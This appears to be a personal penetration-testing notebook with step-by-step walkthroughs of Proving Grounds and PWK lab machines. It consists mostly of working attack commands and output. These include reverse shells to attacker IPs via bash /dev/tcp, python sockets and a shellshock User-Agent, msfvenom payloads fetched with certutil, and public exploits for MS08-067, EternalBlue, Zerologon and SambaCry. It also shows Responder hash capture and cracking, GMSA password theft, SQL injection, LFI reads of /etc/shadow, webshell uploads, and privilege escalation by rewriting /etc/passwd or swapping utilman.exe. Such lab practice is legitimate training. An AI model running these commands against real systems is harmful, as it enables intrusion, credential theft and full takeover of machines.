	infoleak unsuccessful.
	#exploit failed, try different option still failed
http://192.168.160.97:8091/
	RasAP Authentication
	#googling default login found admin:secret
http://192.168.160.97:8091/index.php?page=about
	RaspAP v2.5
	#exploit RasAP 2.5 Authenticated RCE CVE-2020-24572
	#https://github.com/gerbsec/CVE-2020-24572-POC
wget https://github.com/gerbsec/CVE-2020-24572-POC/raw/main/exploit.py
cat exploit.py
	raspap_user = "admin"
python3 exploit.py 192.168.160.97 8091 192.168.49.160 8091 secret 1
nc -lvp 8091
>whoami
	www-data
	#after read writeup actually I can got RCE via webconsole.php
http://192.168.160.97:8091/includes/webconsole.php
>whoami
	www-data
>bash linpeas.sh | tee www-walla-linpeas.txt
>sudo -l
	(ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
>cd /home/walter
>touch asd
	#witable directory
>python -c "import sys; print('\n'.join(sys.path))"
	
	/usr/lib/python2.7
	....
	#hijack python library module import
>cat wifi_reset.py
	import wificontroller
>cp rev.pt winfiocontroller.py
>chmod 777 winfiocontroller.py
>sudo /usr/bin/python /home/walter/wifi_reset.py
nc -lvp 8091
#whoami
	root






Heist provingGrounds
=========================================
sudo autorecon 192.168.160.165
sudo nmap -p- 192.168.160.165 --open -Pn -sV -oN fullnmap
cat fullnmap
	53/tcp    open  domain        Simple DNS Plus
	88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-27 13:58:22Z)
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
	445/tcp   open  microsoft-ds?
	464/tcp   open  kpasswd5?
	593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
	636/tcp   open  tcpwrapped
	3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
	3269/tcp  open  tcpwrapped
	3389/tcp  open  ms-wbt-server Microsoft Terminal Services
	5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
	9389/tcp  open  mc-nmf        .NET Message Framing
	49666/tcp open  msrpc         Microsoft Windows RPC
	#smb nothing, http 5985 nothing, I put kerberos last
http://192.168.160.165:8080/
	Secure Web Browser
http://192.168.160.165:8080/?url=http://192.168.160.165:8080/
	#might got ssrf
http://192.168.160.165:8080/?url=http://192.168.49.160
nc -lvp 80
	User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
	#got response back, I tried to RFI and LFI failed
	#SSRF to responder
sudo responder -I tun0 -rv
	[HTTP] NTLMv2 Client   : 192.168.120.91
	[HTTP] NTLMv2 Username : HEIST\enox
	[HTTP] NTLMv2 Hash     : enox::HEIST:3cb11309cd1acb88:7297ED9.....2E00310031000000000000000000
	#got connection back, it happened because responder force to authenticate via NTLM 401 Unauthorized; WWW-Authenticate: NTLM
	#crack ntlmv2
hashcat -m 5600 hash.txt /opt/rockyou.txt
	california		(enox)
crackmapexec winrm 192.168.160.165 -u enox -p california
	SMB         192.168.160.165 445    DC01             [+] heist.offsec\enox:california
GetUserSPNs.py heist.offsec/enox:california -dc-ip 192.168.160.165 -request
	No entries found!
crackmapexec winrm 192.168.160.165 -u enox -p california
	WINRM       192.168.160.165 5985   NONE             [+] None\enox:california (Pwn3d!)
evil-winrm -i 192.168.160.165 -u enox -p california
>whoami
	heist\enox
>whoami /groups
	HEIST\Web Admins		Group            S-1-5-21-537427935-490066102-1511301751-1104 Mandatory group, Enabled by default, Enabled group
	#got weird groups
>dir users
	09/14/2021  07:27 AM    <DIR>          svc_apache$
	#until here I gave up and openup walktrough
	#the complete path is run bloodhound and found how to abuse to user svc_apache$
>Import-Module ActiveDirectory
>Get-ADPrincipalGroupMembership enox | select name
	Domain Users
	Remote Management Users
	Web Admins
>Get-ADPrincipalGroupMembership svc_apache$ | select name
	Domain Computers
	Remote Management Users
	#check if user allow to retrieve password
>Get-ADServiceAccount -Identity 'svc_apache$' -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword
	PrincipalsAllowedToRetrieveManagedPassword
	------------------------------------------
	{CN=DC01,OU=Domain Controllers,DC=heist,DC=offsec, CN=Web Admins,CN=Users,DC=heist,DC=offsec}
	#there are Web Admins group which is enox groups
	#abuse Group Managed Service Accounts (GMSA) retrieve password from active directory
wget https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe
>GMSAPasswordReader.exe --accountname svc_apache
	...
	Calculating hashes for Current Value
	[*]       rc4_hmac             : E9492A23D8FB9A8E6073EA446D861DCD
evil-winrm -i 192.168.106.165 -u 'svc_apache$' -H E9492A23D8FB9A8E6073EA446D861DCD
>whoami
	heist\svc_apache$
>whoami /priv
	Privilege Name                Description                    State
	============================= ============================== =======
	SeRestorePrivilege            Restore files and directories  Enabled
	#privesc SeRestorePrivilege privesc abuse SeRestorePrivilege
	#https://github.com/gtworek/Priv2Admin
wget https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1
>./EnableSeRestorePrivilege.ps1
	Debug: GetLastError returned: 0
	#now we have write access to system32, change utilman.exe with cmd.exe, trigger with WIN+U
>move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
>move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
rdesktop 192.168.160.165
	WIN+u
	#cmd.exe spawned
>whoami
	nt authority\system
	#everytime see domain controller, try zero logon
	#https://github.com/dirkjanm/CVE-2020-1472
git clone https://github.com/dirkjanm/CVE-2020-1472
crackmapexec smb 192.168.160.165 -u guest -p guest                          
	SMB		192.168.160.165 445    DC01		[*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:heist.offsec) (signing:True) (SMBv1:False)
cat fullnmap
	Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
	#computer name DC01
python3 cve-2020-1472-exploit.py DC01 192.168.160.165





10.11.1.5 PWK ALICE
=========================================
sudo autorecon 10.11.1.5
sudo nmap -p- 10.11.1.5 --open -Pn -sV -oN fullnmap
cat fullnmap
	135/tcp  open  msrpc        Microsoft Windows RPC
	139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds Microsoft Windows XP microsoft-ds
	1025/tcp open  msrpc        Microsoft Windows RPC
crackmapexec smb 10.11.1.5 -u guest -p guest
	SMB         10.11.1.5       445    ALICE            [*] Windows 5.1 (name:ALICE) (domain:thinc.local) (signing:False) (SMBv1:True)
sudo nmap -p445 10.11.1.5 -script=vuln,discovery -Pn
	OS: Windows XP (Windows 2000 LAN Manager)
	| smb-vuln-ms08-067:
	|   VULNERABLE:
	|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
	|     State: VULNERABLE
	|     IDs:  CVE:CVE-2008-4250
	#exploit ms08-067
msfconsole
>use windows/smb/ms08_067_netapi
>set payload windows/shell_reverse_tcp
>set rhost lhost lport
>run
	#exploit succeed
	#exploit ms08-067 without metasploit
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=445 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
python ms08-067.py 10.11.1.5 1 445
	#change 1 to something match with OS version
rlwrap nc -lvp 445
>copy \\192.168.119.175\asd\whoami.exe .
>whoami
	NT AUTHORITY\SYSTEM
>systeminfo
	OS Name:                   Microsoft Windows XP Professional
	OS Version:                5.1.2600 Service Pack 1 Build 2600
>nc 192.168.119.175 445 < \bank-account.zip
binwalk bank.zip
	0	0x0		Zip archive data, encrypted at least v2.0 to extract, compressed size: 1951, uncompressed size: 17920, name: bank-account.xls
fcrackzip -u -D -p /opt/rockyou.txt bank.zip                               80 ⨯
	PASSWORD FOUND!!!!: pw == alice
	#credentials bank-account.xls
cat credz
	SWIDF ID        swisgi
	Reg Username    bobw@acme.local
	Acct Password   3v1lp@ss
	#Eternalblue windows xp MS17-10
	#https://github.com/helviojunior/MS17-010
python send_and_execute.py 10.11.1.5 rshell.exe
	...
	Sending file YW2XJC.exe..
rlwrap nc -lvp 445
>copy \\192.168.119.175\asd\whoami.exe .
>whoami
	NT AUTHORITY\SYSTEM







10.11.1.72 PWK BETA
=================================================
sudo autorecon 10.11.1.72
sudo nmap -p- 10.11.1.72 --open -Pn -sV -oN fullnmap
cat fullnmap
	22/tcp    open  ssh      OpenSSH 5.8p1 Debian 7ubuntu1 (Ubuntu Linux; protocol 2.0)
	25/tcp    open  smtp?
	80/tcp    open  http     Apache httpd 2.2.20 ((Ubuntu))
	110/tcp   open  pop3?
	111/tcp   open  rpcbind  2-4 (RPC #100000)
	119/tcp   open  nntp?
	2049/tcp  open  nfs_acl  2-3 (RPC #100227)
	4555/tcp  open  rsip?
telnet 10.11.1.72 4555
	JAMES Remote Administration Tool 2.3.2
Login id:root
Password:root
>listusers
	user: marcus
	user: john
	user: mailadmin
	user: jenny
	user: ryuu
	user: joe45
>setpassword ryuu asd
	#enumerate email
telnet 10.11.1.72 110
>user ryuu
>pass asd
>list
	1 786
	2 1021
>retr 1
	username: ryuu
	password: QUHqhUPRKXMo4m7k
	#exploit JAMES Remote Administration Tool 2.3.2 RCE
	#somehow I did manually and send email with swaks failed, then I use exploit
searchsploit james 2.3
	Apache James Server 2.3.2 - Remote Command Execution			| linux/remote/35513.py
searchsploit -m 35513
cat 35513.py
	payload = 'bash -i >& /dev/tcp/192.168.119.175/80 0>&1'
	#login to trigger bash_completion.d
ssh ryuu@10.11.1.72
>whoami
	ryuu
>uname -a
	Linux beta 3.0.0-12-generic #20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686 athlon i386 GNU/Linux
	#exlpoit ubuntu kernel 2.6.39 < 3.2.2 mempodipper
searchsploit ubuntu 3.0
	Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Escalation (1)	| linux/local/18411.c
searchsploit -m 18411
>gcc 18411.c -o ex
>./ex
	....
	[+] Executing su with shellcode.
#whoami
	root









10.11.1.71 PWD ALPHA
======================================
sudo autorecon 10.11.1.71
sudo nmap -p- 10.11.1.71 --open -Pn -sV -oN fullnmap
cat fullnmap
	22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
	80/tcp open  http
http://10.11.1.71/site/index.php/
	#static cms website
gobuster dir -u http://10.11.1.71/cgi-bin/ -w /opt/directory-list-2.3-medium.txt --timeout 100s -t 50 -b 404,400 -x .sh,.pl,.py,.cgi
	/admin.cgi            (Status: 200) [Size: 820]
	/test.cgi             (Status: 200) [Size: 1063670]
	/load.sh              (Status: 200) [Size: 387]
	#RCE shellshock admin.cgi
GET /cgi-bin/admin.cgi HTTP/1.1
User-Agent: () { :; }; echo; echo; /bin/bash -c id'
User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.175/80 0>&1'
nc -lvp 80
>whoami
	www-data
>cd ~
>find . | grep config
	/html/templates/config.php
>cat html/templates/config.php
	$bigtree["config"]["db"]["host"] = "localhost";
	$bigtree["config"]["db"]["name"] = "wingnut";
	$bigtree["config"]["db"]["user"] = "root";
	$bigtree["config"]["db"]["password"] = "zaq1xsw2cde3";
>ls /home
	gibson
>su gobson
>whoami
	gibson
>sudo -l
	(ALL : ALL) ALL
>sudo su
#whoami
	root








10.11.1.13 PWK DISCO
=================================================
sudo autorecon 10.11.1.13
sudo nmap -p- 10.11.1.13 --open -Pn -sV -oN fullnmap
cat fullnmap
	21/tcp    open  ftp                Microsoft ftpd
	135/tcp   open  msrpc              Microsoft Windows RPC
	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.2100; RTM
	3389/tcp  open  ssl/ms-wbt-server?
	4167/tcp  open  http               Microsoft IIS httpd 8.5
	5800/tcp  open  vnc-http           TightVNC (user: disco; VNC TCP port: 5900)
	5900/tcp  open  vnc                VNC (protocol 3.8)
	5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
ftp -p 10.11.1.13
>dir
	04-07-19  10:25PM       <DIR>          aspnet_client
	04-07-19  07:14PM                99710 iis-85.png
	04-07-19  07:14PM                  701 iisstart.htm
	#looks like webserver directory
>put fullnmap
http://10.11.1.13:4167/fullnmap
	#exist
>put cmd.aspx
http://10.11.1.13:4167/cmd.aspx
	#reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4167 -f exe -o rshell.exe
	/c cd \ %% mkdir temp
	/c certutil.exe -urlcache -split -f http://192.168.119.175:4167/rshell.exe C:\temp\rshell.exe
	/c C:\temp\rshell.exe
rlwrap nc -lvp 4167
>whoami
	iis apppool\defaultapppool
>whoami /priv
	Privilege Name                Description                               State
	============================= ========================================= ========
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled
>systeminfo
	OS Name:                   Microsoft Windows Server 2012 R2 Standard
	OS Version:                6.3.9600 N/A Build 9600
	#seimpersonate privesc windows server 2012
>certutil.exe -urlcache -split -f http://192.168.119.175:4167/JuicyPotato.exe
>JuicyPotato.exe -t * -l 1337 -p rshell.exe .
rlwrap nc -lvp 4167
>whoami
	nt authority\system








10.11.1.146 PWK SUSIE
=================================================
sudo autorecon 10.11.1.146
sudo nmap -p- 10.11.1.146 --open -Pn -sV -oN fullnmap
cat fullnmap
	22/tcp  open  ssh         OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
	139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
cat tcp_445_smb_nmap.txt
	445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.5.4-Ubuntu (workgroup: WORKGROUP)
sudo nmap -p445 10.11.1.146 -script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -Pn
	Host script results:
	| smb-vuln-cve-2017-7494:
	|   VULNERABLE:
	|   SAMBA Remote Code Execution from Writable Share
	|     State: LIKELY VULNERABLE
	|     IDs:  CVE:CVE-2017-7494
msfconsole
>use exploit/linux/samba/is_known_pipename
>set rhost 10.11.1.146
>run
	RubySMB::Error::EncryptionError Communication error with the remote host: Socket read returned nil. The server supports encryption but was not able to handle the encrypted request.
>set SMB::ProtocolVersion 1
>set SMB::AlwaysEncrypt false
>run
#whoami
	root
	#I manage to do it manually but turn out there is no outbound connection
	#then I flush iptables
	#https://serverfault.com/questions/200635/best-way-to-clear-all-iptables-rules
>iptables-save | awk '/^[*]/ { print $1 }
	/^:[A-Z]+ [^-]/ { print $1 " ACCEPT" ; }
	/COMMIT/ { print $0; }' | iptables-restore
>iptables -S
	-P INPUT ACCEPT
	-P FORWARD ACCEPT
	-P OUTPUT ACCEPT
	#manual exploit sambacry cve-2017-7494
	#https://bond-o.medium.com/sambacry-rce-cve-2017-7494-41c3dcc0b7ae
git clone https://github.com/joxeankoret/CVE-2017-7494
python cve_2017_7494.py -t 10.11.1.146 -u anonymous -P anonyous --rhost 192.168.119.199 --rport 22 -n 1
python cve_2017_7494.py -t 10.11.1.146 -u anonymous -P anonyous --rhost 192.168.119.199 --rport 22 -n 0
nc -lvp 22
#whoami
	root






10.11.1.217 PWK HOTLINE
===========================================
sudo autorecon 10.11.1.146
https://10.11.1.217/
	Elastix login page, default login admin:admin
	#this machine are exact like beep HTB
https://10.11.1.217/mail/
	Roundcube Free Webmail
searchsploit elastix
	FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution			| php/webapps/18650.py
cat 18650.py
	rhost="10.11.1.217"
	lhost="192.168.119.199"
	lport=443
	extension="1000"
python 18650.py
nc -lvp 443
>whoami
	asterisk
>sudo -l
	(root) NOPASSWD: /usr/bin/nmap
	(root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
	#chmod privsc chmod suid
>sudo chmod 4755 /bin/bash
>bash -p
#whoami
	root
	#Elastix 2.2.0 - 'graph.php' Local File Inclusion - https://www.exploit-db.com/exploits/37637
https://10.11.1.217/vtigercrm/graph.php?current_language=../../../../../../../../etc/passwd%00&module=Accounts&action
https://10.11.1.217/vtigercrm/graph.php?current_language=../../../../../../../../etc/shadow%00&module=Accounts&action
	root:$1$uF5XC.Im$8k0Gkw4wYaZkNzuOuySIx/:16902:0:99999:7:::
	#shadow are readable
unshadow passwd.txt shadow.txt > hash.txt
john hash.txt --wordlist=/opt/rockyou.txt








10.11.1.222 PWK CHRIS
========================================
sudo autorecon 10.11.1.222
sudo nmap -p- 10.11.1.222 --open -Pn -sV -oN fullnmap
cat fullnmap
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	1521/tcp  open  oracle-tns    Oracle TNS listener 1.2.0.0.0 (unauthorized)
	2030/tcp  open  oracle-mts    Oracle MTS Recovery Service
	2233/tcp  open  infocrypt?
	3389/tcp  open  ms-wbt-server Microsoft Terminal Services
	5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	8009/tcp  open  ajp13         Apache Jserv (Protocol v1.3)
	8080/tcp  open  http          Apache Tomcat 9.0.19
	47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
http://10.11.1.222:8080/blog/
	#login sqli bypass
	admin' or '1'='1
http://10.11.1.222:8080/blog/home.jsp
	select book from book_table where author='Bob'
	select book from book_table where author='Bob' order by 1 --
	Bob' order by 1--
	Bob' order by 3--
	Bob' order by 4--
	#order by 4 got error, means got 3 rows
select book from book_table where author='Bob' union all select null,null,null from dual --
Bob' UNION ALL SELECT NULL,NULL,NULL FROM DUAL--
	Blog entry from null with title null from 0
	#from here idk what to do because its sqli on oracle then I use sqlmap
sqlmap -r req.txt --dbs --batch
sqlmap -r req.txt -D WEB_APP --dump-all --batch
	+---------+------------------+-----------+
	| USER_ID | PASSWORD         | USER_NAME |
	+---------+------------------+-----------+
	| 1       | thisismypassword | eric      |
	| 2       | bobismyuncle     | alice     |
	| 3       | letmein          | maria     |
	+---------+------------------+-----------+
	#got user but nothing usefull
hydra -L user.txt  -e nsr -P pass.txt 10.11.1.222 rdp
crackmapexec smb 10.11.1.222 -u user.txt -p pass.txt
	+----------+-------------------------------------------------------------------------------+------------+
	| ADMIN_ID | PASSWORD                                                                      | ADMIN_NAME |
	+----------+-------------------------------------------------------------------------------+------------+
	| 1        | d82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892 (adminadmin) | admin      |
	+----------+-------------------------------------------------------------------------------+------------+
http://10.11.1.222:8080/blog/adminlogin.jsp
	#login to admin page, upload file and get reverse shell
http://10.11.1.222:8080/blog/admin.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=5985 -f raw -o rev.jsp
wget https://github.com/tennc/webshell/raw/master/fuzzdb-webshell/jsp/cmd.jsp
	#best jsp webshell
https://github.com/tennc/webshell/blob/master/jsp/shell.jsp
http://10.11.1.222:8080/blog/cmd.jsp
	\\192.168.119.174\asd\rshell.exe
	 C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\blog\rshell.exe
>whoami
	nt authority\system






10.11.1.231 PWK MAILMAN
===================================================
sudo autorecon 10.11.1.231
sudo nmap -p- 10.11.1.231 --open -Pn -sV -oN fullnmap
cat fullnmap
	22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
	25/tcp  open  smtp        Postfix smtpd
	111/tcp open  rpcbind     2-4 (RPC #100000)
	139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SECURITY)
	445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SECURITY)
smbclient \\\\10.11.1.231\\home -U anonymous
>prompt OFF
>recurse ON
>mget *
find .
	#exploit postfix shellshock, sad thing that there is now way to detect this, since it cant detect version of it
	#https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py
wget https://github.com/3mrgnc3/pentest_old/raw/master/postfix-shellshock-nc.py
	#verify user
nc 10.11.1.231 25
vrfy useradm
	252 2.0.0 useradm
python postfix-shellshock-nc.py 10.11.1.231 useradm 192.168.119.174 22
>python -c 'import pty;pty.spawn("/bin/bash")'
>whoami
	useradm
>cat /etc/crontab
	*/5 *   * * *   root    /home/useradm/scripts/cleanup.sh > /dev/null 2>&1
>cat cleanup.sh
	...
	echo "rooot:z3Y6fq9si1hCQ:0:0:root:/root:/bin/bash" >> /etc/passwd
>su rooot
#whoami
	root







10.11.1.123 PWK XOR-APP59
========================================
sudo autorecon 10.11.1.123
sudo nmap -p- 10.11.1.123 --open -Pn -sV -oN fullnmap
cat fullnmap
	80/tcp    open  http          Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.5)
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	443/tcp   open  ssl/http      Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.5)
	445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	3306/tcp  open  mysql         MariaDB (unauthorized)
	3389/tcp  open  ms-wbt-server Microsoft Terminal Services
	5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
cat tcp_80_http_dirb.txt
	==> DIRECTORY: http://10.11.1.123:80/Books/
https://10.11.1.123/books/
view-source:http://10.11.1.123/books/
	5.2.3 (Bizuno Library 3.1.7)
	#there are exploit phreebooks but I don't have any credentials, even with bruteforce
gobuster dir -u https://10.11.1.123/books/ -w /opt/directory-list-2.3-medium.txt --timeout 100s -t 50 -b 404,400 -k                                              1 ⨯
	/apps                 (Status: 301) [Size: 341] [--> https://10.11.1.123/books/apps/]
https://10.11.1.123/books/apps/
	[DIR]	jquery-file-upload/ 	2019-05-21 12:44 	- 	 
	#jQuery-File-Upload 9.22.0 - Arbitrary File Upload CVE-2018-9206
https://10.11.1.123/books/apps/jquery-file-upload/server/php/
	{"files":[]}
cp /opt/p0wny.php .
curl -F "files=@p0wny.php" https://10.11.1.123/books/apps/jquery-file-upload/server/php/ -v -k
https://10.11.1.123/books/apps/jquery-file-upload/server/php/files/p0wny.php
>whoami
	nt authority\system
>dir /a /b /s | findstr proof
	C:\Users\administrator.xor\Desktop\proof.txt









10.11.1.50 PWK BETHANY
========================================
sudo autorecon 10.11.1.50
sudo nmap -p- 10.11.1.50 --open -Pn -sV -oN fullnmap
cat fullnmap
	80/tcp   open  http    Microsoft IIS httpd 8.5
	135/tcp  open  msrpc   Microsoft Windows RPC
	9505/tcp open  http    HttpFileServer httpd
http://10.11.1.50:9505/
view-source:http://10.11.1.50:9505/
	<!--<a href="http://www.rejetto.com/hfs/">HttpFileServer 2.3</a>-->
	#exploit httpfileserver 2.3 hfs 2.3 RCE, just like steel mountain THM and optium HTB
cat 49584.py
	lhost = "192.168.119.174"
	lport = 80
	rhost = "10.11.1.50"
	rport = 9505
python3 49584.py
>whoami
	bethany\bethany
	#enumerate menually
Get-ChildItem -Recurse -Force -ErrorAction SilentlyContinue -Attributes !Directory | findstr conf
Get-ChildItem -Recurse -Force -ErrorAction SilentlyContinue -Attributes !Directory | findstr setting
	-a---        11/14/2014   3:12 PM          1 settings.php
	#settings.php no data (?) means no cretdentials
	#frustated with limited powershell ability I read walktrough and turn out I should collect credentials from other machine
	#escalate to alice
cat root.ps1
	$secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force
	$mycreds = New-Object System.Management.Automation.PSCredential ("alice", $secpasswd)
	$computer = "Bethany"
	[System.Diagnostics.Process]::Start("C:\temp\rshell2.exe", "", $mycreds.Username, $mycreds.Password, $computer)
msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=80 -f exe -o rshell2.exe
	#and need stageless payload to evade defender I think (?)
certutil -urlcache -split -f http://192.168.119.174/rshell2.exe
>powershell -ExecutionPolicy Bypass -File c:\temp\root.ps1
	Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id ProcessName
	-------  ------    -----      ----- -----   ------     -- -----------
		0       2      360         92     3     0.02   3000 rshell
rlwrap nc -lvp 80
>whoami
	bethany\alice
	#actually I can run with staged payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f exe -o rshell.exe
nc -lvp 80                                                                130 ⨯
>whoami
	bethany\alice
>PsExec64.exe -i -d -accepteula -s C:\temp\rshell.exe
>whoami
	nt authority\system









10.11.1.35 PWK PAIN
========================================
sudo autorecon 10.11.1.35
sudo nmap -p- 10.11.1.35 --open -Pn -sV -oN fullnmap
cat fullnmap
	22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
	80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
http://10.11.1.35/
http://10.11.1.35/section.php?page=../../../../../../etc/passwd
	#vulnerable to LFI
http://10.11.1.35/section.php?page=php://filter/convert.base64-encode/resource=section.php
cat section.php
	$page = $_GET["page"];
	include($page);
10.11.1.35/section.php?page=http://192.168.119.174/phpinfo.php
	disable_functions:	base64_decode,eval,proc_open,exec,system,stream_socket_client,fsockopen,socket_create
	#vulnerable to RFI
	#from phpinfo there are some disable function, but there is no shell_exec()
cat cmd.php
	<?php echo shell_exec($_GET['cmd']);?>
http://10.11.1.35/section.php?page=http://192.168.119.174/asd.php&cmd=id
	uid=48(apache) gid=48(apache) groups=48(apache) 
10.11.1.35/section.php?page=http://192.168.119.174/asd.php&cmd=python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.174",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -lvp 22
>whoami
	apache
	#after read walktrough actually we can get RCE via LFI (?)
http://10.11.1.35/section.php?page=data:text/plain,<?php phpinfo();?>
http://10.11.1.35/section.php?page=data:text/plain,<?php echo shell_exec("ping -c4 192.168.119.174");?>
>find / -perm -4000 2>/dev/null | xargs ls -laht
	-rwsr-xr-x. 1 root root 152K Oct 30  2018 /usr/bin/cp
	#cp privesc cp suid
>vi passwd.txt
	rooot:z3Y6fq9si1hCQ:0:0:root:/root:/bin/bash
>cp pwd /etc/passwd
>su rooot
#whoami
	root








10.11.1.141 PWK FC4
========================================
sudo autorecon 10.11.1.141
sudo nmap -p- 10.11.1.141 --open -Pn -sV -oN fullnmap
	22/tcp    open  ssh     OpenSSH 4.0 (protocol 2.0)
	111/tcp   open  rpcbind 2 (RPC #100000)
	10000/tcp open  http    MiniServ 0.01 (Webmin httpd)
http://10.11.1.141:10000/
	#try to get RCE via login.cgi like Beep HTB Failed, maybe because different version
cat tcp_10000_http_nmap.txt
	| http-vuln-cve2006-3392:
	|   VULNERABLE:
	|   Webmin File Disclosure
searchsploit webmin 0.01
	------------------------------------------------------------------------ ---------------------------
	Exploit Title															|  Path
	------------------------------------------------------------------------ ---------------------------
	Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure			| multiple/remote/1997.php
	#exploit old webmin 0.01
searchsploit -m 1997
php 1997.php 10.11.1.141 10000 http /etc/passwd
	Uncaught Error: Call to undefined function curl_init()
sudo apt-get install php-curl
php 1997.php 10.11.1.141 10000 http /etc/passwd
php 1997.php 10.11.1.141 10000 http /etc/shadow
unshadow passwd.txt shadow.txt > hash.txt
john hash.txt --wordlist=/opt/rockyou.txt
	loading1         (alice)
	BUGZBUNNY        (bob)
ssh alice@10.11.1.141
	Unable to negotiate with 10.11.1.141 port 22: no matching key exchange method found. Their offer: 
	diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1  bob@10.11.1.141
>whoami
	bob
	#webmin LFI to rce via reverse perl cgi priviledge escalation
	#http://pentestmonkey.net/tools/web-shells/perl-reverse-shell
>wget http://192.168.119.149:22/perl-reverse-shell.pl
>cp perl-reverse-shell.pl /tmp/perl-reverse-shell.cgi
>chmod 777 /tmp/perl-reverse-shell.cgi
php 1997.php 10.11.1.141 10000 http tmp/perl-reverse-shell.cgi
http://10.11.1.141:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/tmp/reverse-shell.cgi
nc -lvp 22
#whoami
	root






10.11.1.128 DJ
========================================
sudo autorecon 10.11.1.128
sudo nmap -p- 10.11.1.128 --open -Pn -sV -oN fullnmap
cat fullnmap
	21/tcp    open  ftp                Microsoft ftpd
	135/tcp   open  msrpc              Microsoft Windows RPC
	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.2100; RTM
	3389/tcp  open  ssl/ms-wbt-server?
	4167/tcp  open  http               Microsoft IIS httpd 8.5
